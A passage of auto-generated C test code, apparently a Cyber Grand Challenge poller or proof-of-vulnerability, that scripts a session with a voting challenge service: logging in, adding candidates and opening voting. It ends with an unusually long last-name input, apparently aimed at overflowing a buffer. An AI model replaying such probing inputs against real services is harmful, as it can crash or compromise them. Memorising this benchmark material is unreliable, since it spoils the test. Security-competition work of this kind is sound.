         "\x31\x32\x33\x34\x31\x32\x33\x34\x0a";
      read_00020_ptr += cgc_data_match(read_00020 + read_00020_ptr, read_00020_len - read_00020_ptr, match_00020_00000, 9);
      cgc_free(read_00020);
      if (read_00020_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00021;
      unsigned int read_00021_len;
      unsigned int read_00021_ptr = 0;
      //**** length cgc_read
      read_00021_len = 41;
      read_00021 = (unsigned char*)cgc_malloc(read_00021_len);
      int read_00021_res = cgc_length_read(0, read_00021, read_00021_len);
      if (read_00021_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00021_00000[] = 
         "\x31\x34\x3a\x20\x4c\x6f\x67\x69\x6e\x0a\x00\x33\x38\x2e\x20\x52"
         "\x65\x67\x69\x73\x74\x65\x72\x20\x56\x6f\x74\x65\x72\x0a\x00\x39"
         "\x35\x2e\x20\x51\x75\x69\x74\x0a\x00";
      read_00021_ptr += cgc_data_match(read_00021 + read_00021_ptr, read_00021_len - read_00021_ptr, match_00021_00000, 41);
      cgc_free(read_00021);
      if (read_00021_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00022;
      unsigned int read_00022_len;
      unsigned int read_00022_ptr = 0;
      //**** length cgc_read
      read_00022_len = 19;
      read_00022 = (unsigned char*)cgc_malloc(read_00022_len);
      int read_00022_res = cgc_length_read(0, read_00022, read_00022_len);
      if (read_00022_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00022_00000[] = 
         "\x43\x68\x6f\x6f\x73\x65\x20\x61\x6e\x20\x6f\x70\x74\x69\x6f\x6e"
         "\x3a\x20\x00";
      read_00022_ptr += cgc_data_match(read_00022 + read_00022_ptr, read_00022_len - read_00022_ptr, match_00022_00000, 19);
      cgc_free(read_00022);
      if (read_00022_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00014_00000[] = 
         "\x31\x34\x0a";
      static unsigned int write_00014_00000_len = 3;
      unsigned char *write_00014 = NULL;
      unsigned int write_00014_len = 0;
      write_00014 = cgc_append_buf(write_00014, &write_00014_len, write_00014_00000, write_00014_00000_len);
      if (write_00014_len > 0) {
         cgc_transmit_all(1, write_00014, write_00014_len);
      }
      cgc_free(write_00014);
   } while (0);
   do {
      unsigned char *read_00023;
      unsigned int read_00023_len;
      unsigned int read_00023_ptr = 0;
      //**** length cgc_read
      read_00023_len = 24;
      read_00023 = (unsigned char*)cgc_malloc(read_00023_len);
      int read_00023_res = cgc_length_read(0, read_00023, read_00023_len);
      if (read_00023_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00023_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x49\x44\x20\x6e"
         "\x75\x6d\x62\x65\x72\x3a\x20\x00";
      read_00023_ptr += cgc_data_match(read_00023 + read_00023_ptr, read_00023_len - read_00023_ptr, match_00023_00000, 24);
      cgc_free(read_00023);
      if (read_00023_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00015_00000[] = 
         "\x31\x30\x31\x30\x31\x30\x31\x30\x0a";
      static unsigned int write_00015_00000_len = 9;
      unsigned char *write_00015 = NULL;
      unsigned int write_00015_len = 0;
      write_00015 = cgc_append_buf(write_00015, &write_00015_len, write_00015_00000, write_00015_00000_len);
      if (write_00015_len > 0) {
         cgc_transmit_all(1, write_00015, write_00015_len);
      }
      cgc_free(write_00015);
   } while (0);
   do {
      unsigned char *read_00024;
      unsigned int read_00024_len;
      unsigned int read_00024_ptr = 0;
      //**** length cgc_read
      read_00024_len = 19;
      read_00024 = (unsigned char*)cgc_malloc(read_00024_len);
      int read_00024_res = cgc_length_read(0, read_00024, read_00024_len);
      if (read_00024_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00024_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x6c\x61\x73\x74\x20\x6e\x61\x6d\x65"
         "\x3a\x20\x00";
      read_00024_ptr += cgc_data_match(read_00024 + read_00024_ptr, read_00024_len - read_00024_ptr, match_00024_00000, 19);
      cgc_free(read_00024);
      if (read_00024_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00016_00000[] = 
         "\x45\x6b\x45\x61\x56\x68\x50\x6c\x41\x52\x79\x50\x70\x45\x6a\x6d"
         "\x4a\x59\x59\x55\x4a\x66\x68\x75\x48\x63\x43\x74\x48\x6c\x0a";
      static unsigned int write_00016_00000_len = 31;
      unsigned char *write_00016 = NULL;
      unsigned int write_00016_len = 0;
      write_00016 = cgc_append_buf(write_00016, &write_00016_len, write_00016_00000, write_00016_00000_len);
      if (write_00016_len > 0) {
         cgc_transmit_all(1, write_00016, write_00016_len);
      }
      cgc_free(write_00016);
   } while (0);
   do {
      unsigned char *read_00025;
      unsigned int read_00025_len;
      unsigned int read_00025_ptr = 0;
      //**** length cgc_read
      read_00025_len = 18;
      read_00025 = (unsigned char*)cgc_malloc(read_00025_len);
      int read_00025_res = cgc_length_read(0, read_00025, read_00025_len);
      if (read_00025_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00025_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x61\x75\x74\x68\x20\x6b\x65\x79\x3a"
         "\x20\x00";
      read_00025_ptr += cgc_data_match(read_00025 + read_00025_ptr, read_00025_len - read_00025_ptr, match_00025_00000, 18);
      cgc_free(read_00025);
      if (read_00025_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      unsigned char *write_00017 = NULL;
      unsigned int write_00017_len = 0;
      write_00017 = cgc_append_var("authkey", write_00017, &write_00017_len);
      if (write_00017_len > 0) {
         cgc_transmit_all(1, write_00017, write_00017_len);
      }
      cgc_free(write_00017);
   } while (0);
   do {
      unsigned char *read_00026;
      unsigned int read_00026_len;
      unsigned int read_00026_ptr = 0;
      //**** length cgc_read
      read_00026_len = 82;
      read_00026 = (unsigned char*)cgc_malloc(read_00026_len);
      int read_00026_res = cgc_length_read(0, read_00026, read_00026_len);
      if (read_00026_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00026_00000[] = 
         "\x31\x35\x3a\x20\x4d\x61\x69\x6e\x20\x4d\x65\x6e\x75\x0a\x00\x31"
         "\x38\x2e\x20\x4f\x70\x65\x6e\x20\x56\x6f\x74\x69\x6e\x67\x0a\x00"
         "\x32\x32\x2e\x20\x45\x6c\x65\x63\x74\x69\x6f\x6e\x20\x53\x74\x61"
         "\x74\x75\x73\x0a\x00\x35\x34\x2e\x20\x41\x64\x64\x20\x43\x61\x6e"
         "\x64\x69\x64\x61\x74\x65\x0a\x00\x39\x35\x2e\x20\x51\x75\x69\x74"
         "\x0a\x00";
      read_00026_ptr += cgc_data_match(read_00026 + read_00026_ptr, read_00026_len - read_00026_ptr, match_00026_00000, 82);
      cgc_free(read_00026);
      if (read_00026_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00027;
      unsigned int read_00027_len;
      unsigned int read_00027_ptr = 0;
      //**** length cgc_read
      read_00027_len = 19;
      read_00027 = (unsigned char*)cgc_malloc(read_00027_len);
      int read_00027_res = cgc_length_read(0, read_00027, read_00027_len);
      if (read_00027_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00027_00000[] = 
         "\x43\x68\x6f\x6f\x73\x65\x20\x61\x6e\x20\x6f\x70\x74\x69\x6f\x6e"
         "\x3a\x20\x00";
      read_00027_ptr += cgc_data_match(read_00027 + read_00027_ptr, read_00027_len - read_00027_ptr, match_00027_00000, 19);
      cgc_free(read_00027);
      if (read_00027_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00018_00000[] = 
         "\x35\x34\x0a";
      static unsigned int write_00018_00000_len = 3;
      unsigned char *write_00018 = NULL;
      unsigned int write_00018_len = 0;
      write_00018 = cgc_append_buf(write_00018, &write_00018_len, write_00018_00000, write_00018_00000_len);
      if (write_00018_len > 0) {
         cgc_transmit_all(1, write_00018, write_00018_len);
      }
      cgc_free(write_00018);
   } while (0);
   do {
      unsigned char *read_00028;
      unsigned int read_00028_len;
      unsigned int read_00028_ptr = 0;
      //**** length cgc_read
      read_00028_len = 24;
      read_00028 = (unsigned char*)cgc_malloc(read_00028_len);
      int read_00028_res = cgc_length_read(0, read_00028, read_00028_len);
      if (read_00028_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00028_00000[] = 
         "\x23\x23\x20\x43\x72\x65\x61\x74\x65\x20\x63\x61\x6e\x64\x69\x64"
         "\x61\x74\x65\x20\x23\x23\x0a\x00";
      read_00028_ptr += cgc_data_match(read_00028 + read_00028_ptr, read_00028_len - read_00028_ptr, match_00028_00000, 24);
      cgc_free(read_00028);
      if (read_00028_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00029;
      unsigned int read_00029_len;
      unsigned int read_00029_ptr = 0;
      //**** length cgc_read
      read_00029_len = 20;
      read_00029 = (unsigned char*)cgc_malloc(read_00029_len);
      int read_00029_res = cgc_length_read(0, read_00029, read_00029_len);
      if (read_00029_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00029_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x66\x69\x72\x73\x74\x20\x6e\x61\x6d"
         "\x65\x3a\x20\x00";
      read_00029_ptr += cgc_data_match(read_00029 + read_00029_ptr, read_00029_len - read_00029_ptr, match_00029_00000, 20);
      cgc_free(read_00029);
      if (read_00029_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00019_00000[] = 
         "\x69\x54\x78\x66\x4a\x0a";
      static unsigned int write_00019_00000_len = 6;
      unsigned char *write_00019 = NULL;
      unsigned int write_00019_len = 0;
      write_00019 = cgc_append_buf(write_00019, &write_00019_len, write_00019_00000, write_00019_00000_len);
      if (write_00019_len > 0) {
         cgc_transmit_all(1, write_00019, write_00019_len);
      }
      cgc_free(write_00019);
   } while (0);
   do {
      unsigned char *read_00030;
      unsigned int read_00030_len;
      unsigned int read_00030_ptr = 0;
      //**** length cgc_read
      read_00030_len = 19;
      read_00030 = (unsigned char*)cgc_malloc(read_00030_len);
      int read_00030_res = cgc_length_read(0, read_00030, read_00030_len);
      if (read_00030_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00030_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x6c\x61\x73\x74\x20\x6e\x61\x6d\x65"
         "\x3a\x20\x00";
      read_00030_ptr += cgc_data_match(read_00030 + read_00030_ptr, read_00030_len - read_00030_ptr, match_00030_00000, 19);
      cgc_free(read_00030);
      if (read_00030_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00020_00000[] = 
         "\x61\x78\x5a\x45\x6c\x64\x57\x56\x56\x57\x52\x47\x4c\x56\x0a";
      static unsigned int write_00020_00000_len = 15;
      unsigned char *write_00020 = NULL;
      unsigned int write_00020_len = 0;
      write_00020 = cgc_append_buf(write_00020, &write_00020_len, write_00020_00000, write_00020_00000_len);
      if (write_00020_len > 0) {
         cgc_transmit_all(1, write_00020, write_00020_len);
      }
      cgc_free(write_00020);
   } while (0);
   do {
      unsigned char *read_00031;
      unsigned int read_00031_len;
      unsigned int read_00031_ptr = 0;
      //**** length cgc_read
      read_00031_len = 18;
      read_00031 = (unsigned char*)cgc_malloc(read_00031_len);
      int read_00031_res = cgc_length_read(0, read_00031, read_00031_len);
      if (read_00031_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00031_00000[] = 
         "\x43\x61\x6e\x64\x69\x64\x61\x74\x65\x20\x41\x64\x64\x65\x64\x2e"
         "\x0a\x00";
      read_00031_ptr += cgc_data_match(read_00031 + read_00031_ptr, read_00031_len - read_00031_ptr, match_00031_00000, 18);
      cgc_free(read_00031);
      if (read_00031_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00032;
      unsigned int read_00032_len;
      unsigned int read_00032_ptr = 0;
      //**** length cgc_read
      read_00032_len = 41;
      read_00032 = (unsigned char*)cgc_malloc(read_00032_len);
      int read_00032_res = cgc_length_read(0, read_00032, read_00032_len);
      if (read_00032_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00032_00000[] = 
         "\x31\x34\x3a\x20\x4c\x6f\x67\x69\x6e\x0a\x00\x33\x38\x2e\x20\x52"
         "\x65\x67\x69\x73\x74\x65\x72\x20\x56\x6f\x74\x65\x72\x0a\x00\x39"
         "\x35\x2e\x20\x51\x75\x69\x74\x0a\x00";
      read_00032_ptr += cgc_data_match(read_00032 + read_00032_ptr, read_00032_len - read_00032_ptr, match_00032_00000, 41);
      cgc_free(read_00032);
      if (read_00032_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00033;
      unsigned int read_00033_len;
      unsigned int read_00033_ptr = 0;
      //**** length cgc_read
      read_00033_len = 19;
      read_00033 = (unsigned char*)cgc_malloc(read_00033_len);
      int read_00033_res = cgc_length_read(0, read_00033, read_00033_len);
      if (read_00033_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00033_00000[] = 
         "\x43\x68\x6f\x6f\x73\x65\x20\x61\x6e\x20\x6f\x70\x74\x69\x6f\x6e"
         "\x3a\x20\x00";
      read_00033_ptr += cgc_data_match(read_00033 + read_00033_ptr, read_00033_len - read_00033_ptr, match_00033_00000, 19);
      cgc_free(read_00033);
      if (read_00033_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00021_00000[] = 
         "\x31\x34\x0a";
      static unsigned int write_00021_00000_len = 3;
      unsigned char *write_00021 = NULL;
      unsigned int write_00021_len = 0;
      write_00021 = cgc_append_buf(write_00021, &write_00021_len, write_00021_00000, write_00021_00000_len);
      if (write_00021_len > 0) {
         cgc_transmit_all(1, write_00021, write_00021_len);
      }
      cgc_free(write_00021);
   } while (0);
   do {
      unsigned char *read_00034;
      unsigned int read_00034_len;
      unsigned int read_00034_ptr = 0;
      //**** length cgc_read
      read_00034_len = 24;
      read_00034 = (unsigned char*)cgc_malloc(read_00034_len);
      int read_00034_res = cgc_length_read(0, read_00034, read_00034_len);
      if (read_00034_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00034_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x49\x44\x20\x6e"
         "\x75\x6d\x62\x65\x72\x3a\x20\x00";
      read_00034_ptr += cgc_data_match(read_00034 + read_00034_ptr, read_00034_len - read_00034_ptr, match_00034_00000, 24);
      cgc_free(read_00034);
      if (read_00034_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00022_00000[] = 
         "\x31\x30\x31\x30\x31\x30\x31\x30\x0a";
      static unsigned int write_00022_00000_len = 9;
      unsigned char *write_00022 = NULL;
      unsigned int write_00022_len = 0;
      write_00022 = cgc_append_buf(write_00022, &write_00022_len, write_00022_00000, write_00022_00000_len);
      if (write_00022_len > 0) {
         cgc_transmit_all(1, write_00022, write_00022_len);
      }
      cgc_free(write_00022);
   } while (0);
   do {
      unsigned char *read_00035;
      unsigned int read_00035_len;
      unsigned int read_00035_ptr = 0;
      //**** length cgc_read
      read_00035_len = 19;
      read_00035 = (unsigned char*)cgc_malloc(read_00035_len);
      int read_00035_res = cgc_length_read(0, read_00035, read_00035_len);
      if (read_00035_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00035_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x6c\x61\x73\x74\x20\x6e\x61\x6d\x65"
         "\x3a\x20\x00";
      read_00035_ptr += cgc_data_match(read_00035 + read_00035_ptr, read_00035_len - read_00035_ptr, match_00035_00000, 19);
      cgc_free(read_00035);
      if (read_00035_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00023_00000[] = 
         "\x45\x6b\x45\x61\x56\x68\x50\x6c\x41\x52\x79\x50\x70\x45\x6a\x6d"
         "\x4a\x59\x59\x55\x4a\x66\x68\x75\x48\x63\x43\x74\x48\x6c\x0a";
      static unsigned int write_00023_00000_len = 31;
      unsigned char *write_00023 = NULL;
      unsigned int write_00023_len = 0;
      write_00023 = cgc_append_buf(write_00023, &write_00023_len, write_00023_00000, write_00023_00000_len);
      if (write_00023_len > 0) {
         cgc_transmit_all(1, write_00023, write_00023_len);
      }
      cgc_free(write_00023);
   } while (0);
   do {
      unsigned char *read_00036;
      unsigned int read_00036_len;
      unsigned int read_00036_ptr = 0;
      //**** length cgc_read
      read_00036_len = 18;
      read_00036 = (unsigned char*)cgc_malloc(read_00036_len);
      int read_00036_res = cgc_length_read(0, read_00036, read_00036_len);
      if (read_00036_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00036_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x61\x75\x74\x68\x20\x6b\x65\x79\x3a"
         "\x20\x00";
      read_00036_ptr += cgc_data_match(read_00036 + read_00036_ptr, read_00036_len - read_00036_ptr, match_00036_00000, 18);
      cgc_free(read_00036);
      if (read_00036_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      unsigned char *write_00024 = NULL;
      unsigned int write_00024_len = 0;
      write_00024 = cgc_append_var("authkey", write_00024, &write_00024_len);
      if (write_00024_len > 0) {
         cgc_transmit_all(1, write_00024, write_00024_len);
      }
      cgc_free(write_00024);
   } while (0);
   do {
      unsigned char *read_00037;
      unsigned int read_00037_len;
      unsigned int read_00037_ptr = 0;
      //**** length cgc_read
      read_00037_len = 82;
      read_00037 = (unsigned char*)cgc_malloc(read_00037_len);
      int read_00037_res = cgc_length_read(0, read_00037, read_00037_len);
      if (read_00037_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00037_00000[] = 
         "\x31\x35\x3a\x20\x4d\x61\x69\x6e\x20\x4d\x65\x6e\x75\x0a\x00\x31"
         "\x38\x2e\x20\x4f\x70\x65\x6e\x20\x56\x6f\x74\x69\x6e\x67\x0a\x00"
         "\x32\x32\x2e\x20\x45\x6c\x65\x63\x74\x69\x6f\x6e\x20\x53\x74\x61"
         "\x74\x75\x73\x0a\x00\x35\x34\x2e\x20\x41\x64\x64\x20\x43\x61\x6e"
         "\x64\x69\x64\x61\x74\x65\x0a\x00\x39\x35\x2e\x20\x51\x75\x69\x74"
         "\x0a\x00";
      read_00037_ptr += cgc_data_match(read_00037 + read_00037_ptr, read_00037_len - read_00037_ptr, match_00037_00000, 82);
      cgc_free(read_00037);
      if (read_00037_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00038;
      unsigned int read_00038_len;
      unsigned int read_00038_ptr = 0;
      //**** length cgc_read
      read_00038_len = 19;
      read_00038 = (unsigned char*)cgc_malloc(read_00038_len);
      int read_00038_res = cgc_length_read(0, read_00038, read_00038_len);
      if (read_00038_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00038_00000[] = 
         "\x43\x68\x6f\x6f\x73\x65\x20\x61\x6e\x20\x6f\x70\x74\x69\x6f\x6e"
         "\x3a\x20\x00";
      read_00038_ptr += cgc_data_match(read_00038 + read_00038_ptr, read_00038_len - read_00038_ptr, match_00038_00000, 19);
      cgc_free(read_00038);
      if (read_00038_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00025_00000[] = 
         "\x31\x38\x0a";
      static unsigned int write_00025_00000_len = 3;
      unsigned char *write_00025 = NULL;
      unsigned int write_00025_len = 0;
      write_00025 = cgc_append_buf(write_00025, &write_00025_len, write_00025_00000, write_00025_00000_len);
      if (write_00025_len > 0) {
         cgc_transmit_all(1, write_00025, write_00025_len);
      }
      cgc_free(write_00025);
   } while (0);
   do {
      unsigned char *read_00039;
      unsigned int read_00039_len;
      unsigned int read_00039_ptr = 0;
      //**** length cgc_read
      read_00039_len = 14;
      read_00039 = (unsigned char*)cgc_malloc(read_00039_len);
      int read_00039_res = cgc_length_read(0, read_00039, read_00039_len);
      if (read_00039_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00039_00000[] = 
         "\x56\x6f\x74\x69\x6e\x67\x20\x4f\x70\x65\x6e\x2e\x0a\x00";
      read_00039_ptr += cgc_data_match(read_00039 + read_00039_ptr, read_00039_len - read_00039_ptr, match_00039_00000, 14);
      cgc_free(read_00039);
      if (read_00039_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00040;
      unsigned int read_00040_len;
      unsigned int read_00040_ptr = 0;
      //**** length cgc_read
      read_00040_len = 41;
      read_00040 = (unsigned char*)cgc_malloc(read_00040_len);
      int read_00040_res = cgc_length_read(0, read_00040, read_00040_len);
      if (read_00040_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00040_00000[] = 
         "\x31\x34\x3a\x20\x4c\x6f\x67\x69\x6e\x0a\x00\x33\x38\x2e\x20\x52"
         "\x65\x67\x69\x73\x74\x65\x72\x20\x56\x6f\x74\x65\x72\x0a\x00\x39"
         "\x35\x2e\x20\x51\x75\x69\x74\x0a\x00";
      read_00040_ptr += cgc_data_match(read_00040 + read_00040_ptr, read_00040_len - read_00040_ptr, match_00040_00000, 41);
      cgc_free(read_00040);
      if (read_00040_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00041;
      unsigned int read_00041_len;
      unsigned int read_00041_ptr = 0;
      //**** length cgc_read
      read_00041_len = 19;
      read_00041 = (unsigned char*)cgc_malloc(read_00041_len);
      int read_00041_res = cgc_length_read(0, read_00041, read_00041_len);
      if (read_00041_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00041_00000[] = 
         "\x43\x68\x6f\x6f\x73\x65\x20\x61\x6e\x20\x6f\x70\x74\x69\x6f\x6e"
         "\x3a\x20\x00";
      read_00041_ptr += cgc_data_match(read_00041 + read_00041_ptr, read_00041_len - read_00041_ptr, match_00041_00000, 19);
      cgc_free(read_00041);
      if (read_00041_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00026_00000[] = 
         "\x31\x34\x0a";
      static unsigned int write_00026_00000_len = 3;
      unsigned char *write_00026 = NULL;
      unsigned int write_00026_len = 0;
      write_00026 = cgc_append_buf(write_00026, &write_00026_len, write_00026_00000, write_00026_00000_len);
      if (write_00026_len > 0) {
         cgc_transmit_all(1, write_00026, write_00026_len);
      }
      cgc_free(write_00026);
   } while (0);
   do {
      unsigned char *read_00042;
      unsigned int read_00042_len;
      unsigned int read_00042_ptr = 0;
      //**** length cgc_read
      read_00042_len = 24;
      read_00042 = (unsigned char*)cgc_malloc(read_00042_len);
      int read_00042_res = cgc_length_read(0, read_00042, read_00042_len);
      if (read_00042_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00042_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x49\x44\x20\x6e"
         "\x75\x6d\x62\x65\x72\x3a\x20\x00";
      read_00042_ptr += cgc_data_match(read_00042 + read_00042_ptr, read_00042_len - read_00042_ptr, match_00042_00000, 24);
      cgc_free(read_00042);
      if (read_00042_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00027_00000[] = 
         "\x31\x32\x33\x34\x31\x32\x33\x34\x0a";
      static unsigned int write_00027_00000_len = 9;
      unsigned char *write_00027 = NULL;
      unsigned int write_00027_len = 0;
      write_00027 = cgc_append_buf(write_00027, &write_00027_len, write_00027_00000, write_00027_00000_len);
      if (write_00027_len > 0) {
         cgc_transmit_all(1, write_00027, write_00027_len);
      }
      cgc_free(write_00027);
   } while (0);
   do {
      unsigned char *read_00043;
      unsigned int read_00043_len;
      unsigned int read_00043_ptr = 0;
      //**** length cgc_read
      read_00043_len = 19;
      read_00043 = (unsigned char*)cgc_malloc(read_00043_len);
      int read_00043_res = cgc_length_read(0, read_00043, read_00043_len);
      if (read_00043_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00043_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x6c\x61\x73\x74\x20\x6e\x61\x6d\x65"
         "\x3a\x20\x00";
      read_00043_ptr += cgc_data_match(read_00043 + read_00043_ptr, read_00043_len - read_00043_ptr, match_00043_00000, 19);
      cgc_free(read_00043);
      if (read_00043_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00028_00000[] = 
         "\x66\x6e\x46\x4e\x48\x6e\x76\x7a\x6b\x76\x53\x57\x5a\x72\x58\x46"
         "\x4d\x55\x4d\x46\x42\x73\x59\x47\x6a\x63\x55\x62\x55\x55\x76\x78"
         "\x56\x50\x72\x62\x51\x78\x7a\x6e\x58\x6d\x55\x6f\x72\x4f\x51\x50"
         "\x50\x42\x70\x56\x48\x68\x73\x67\x76\x79\x56\x6e\x4a\x46\x55\x4b"
         "\x4c\x41\x4d\x78\x41\x69\x68\x75\x61\x48\x69\x78\x41\x67\x47\x67"
         "\x7a\x41\x6b\x4f\x4d\x4f\x4d\x67\x46\x6a\x67\x71\x73\x78\x42\x44"
         "\x48\x67\x4c\x6a\x73\x51\x56\x6d\x51\x55\x72\x50\x46\x4d\x65\x74"
         "\x61\x4c\x46\x77\x46\x73\x61\x4f\x50\x74\x68\x7a\x6b\x42\x64\x72"
         "\x47\x7a\x51\x57\x45\x46\x42\x58\x6e\x4d\x4c\x65\x61\x54\x58\x53"
         "\x67\x4e\x69\x58\x6d\x64\x48\x78\x61\x43\x4f\x69\x4d\x72\x79\x4f"
         "\x64\x50\x70\x74\x67\x5a\x77\x79\x7a\x55\x45\x47\x56\x47\x6b\x78"
         "\x4a\x72\x75\x76\x4d\x53\x59\x51\x7a\x73\x43\x4e\x7a\x50\x67\x4d"
         "\x69\x79\x65\x57\x71\x79\x6e\x57\x6d\x66\x51\x7a\x76\x55\x67\x4a"
         "\x45\x57\x76\x47\x4a\x4c\x72\x43\x69\x47\x4d\x67\x53\x49\x69\x49"
         "\x57\x50\x4d\x6a\x70\x48\x66\x51\x46\x76\x50\x72\x6c\x56\x76\x69"
         "\x61\x57\x73\x56\x74\x6d\x71\x72\x4e\x52\x6d\x4f\x44\x6c\x61\x59"
         "\x66\x49\x56\x78\x44\x47\x55\x79\x4f\x5a\x5a\x58\x79\x57\x64\x4e"
         "\x4d\x43\x48\x79\x70\x67\x6a\x4e\x68\x54\x6e\x73\x6c\x68\x78\x4a"
         "\x45\x4f\x4e\x4b\x71\x66\x68\x43\x68\x54\x63\x6a\x56\x4e\x68\x54"
         "\x4d\x6d\x75\x45\x43\x69\x55\x4a\x72\x41\x5a\x44\x64\x69\x56\x52"
         "\x41\x4a\x69\x56\x72\x53\x74\x79\x70\x75\x68\x52\x63\x7a\x74\x52"
         "\x71\x77\x43\x74\x75\x54\x43\x58\x79\x76\x4b\x53\x77\x77\x6b\x79"
         "\x42\x68\x47\x44\x43\x79\x77\x63\x4b\x6d\x6c\x48\x4b\x43\x4c\x4b"
         "\x66\x5a\x6e\x5a\x62\x61\x43\x44\x46\x76\x4c\x47\x47\x69\x52\x57"
         "\x4c\x70\x4a\x6c\x66\x76\x77\x67\x66\x54\x48\x62\x4a\x76\x64\x44"
         "\x73\x45\x75\x45\x53\x51\x51\x54\x52\x59\x61\x51\x53\x59\x6a\x61"
         "\x72\x72\x6b\x69\x56\x55\x43\x41\x6a\x4f\x49\x43\x6e\x63\x52\x5a"
         "\x50\x43\x70\x6a\x42\x5a\x5a\x46\x6e\x50\x69\x4f\x41\x45\x7a\x62"
         "\x6b\x4c\x68\x42\x41\x44\x4c\x43\x73\x61\x58\x49\x50\x77\x69\x6d"
         "\x72\x7a\x55\x4f\x65\x73\x71\x6b\x51\x69\x74\x54\x6d\x62\x76\x7a"
         "\x53\x76\x53\x64\x7a\x4a\x54\x6e\x4c\x6b\x49\x50\x54\x65\x6b\x48"
         "\x54\x6d\x74\x48\x4e\x41\x46\x4b\x78\x6b\x7a\x76\x6e\x75\x78\x77"
         "\x61\x55\x59\x62\x69\x59\x57\x69\x59\x49\x78\x52\x77\x58\x58\x5a"
         "\x49\x67\x50\x66\x78\x6e\x4f\x72\x73\x4b\x63\x68\x49\x68\x4c\x46"
         "\x78\x58\x6a\x41\x5a\x53\x41\x42\x6e\x74\x68\x44\x52\x41\x52\x45"
         "\x59\x46\x72\x66\x74\x79\x47\x69\x4d\x42\x62\x77\x6b\x6e\x45\x5a"
         "\x76\x6d\x74\x59\x43\x67\x49\x58\x65\x61\x46\x78\x53\x4d\x7a\x79"
         "\x4a\x52\x45\x4f\x7a\x51\x4c\x6f\x79\x64\x4b\x70\x50\x74\x4e\x4e"
         "\x41\x44\x44\x44\x41\x79\x50\x44\x53\x66\x42\x42\x79\x72\x43\x58"
         "\x5a\x74\x66\x79\x56\x79\x6b\x42\x45\x64\x74\x73\x48\x49\x4d\x48"
         "\x4c\x6c\x44\x44\x7a\x61\x6c\x70\x53\x7a\x75\x49\x5a\x70\x46\x50"
         "\x65\x78\x55\x45\x72\x79\x6d\x6a\x58\x62\x72\x63\x43\x65\x6b\x66"
         "\x47\x58\x76\x75\x54\x78\x6e\x47\x41\x46\x62\x7a\x69\x6b\x52\x6b"
         "\x62\x6e\x57\x46\x68\x64\x49\x51\x68\x43\x4b\x58\x41\x41\x4a\x79"
         "\x71\x4a\x5a\x4b\x4a\x67\x47\x62\x51\x50\x67\x74\x76\x4f\x53\x6e"
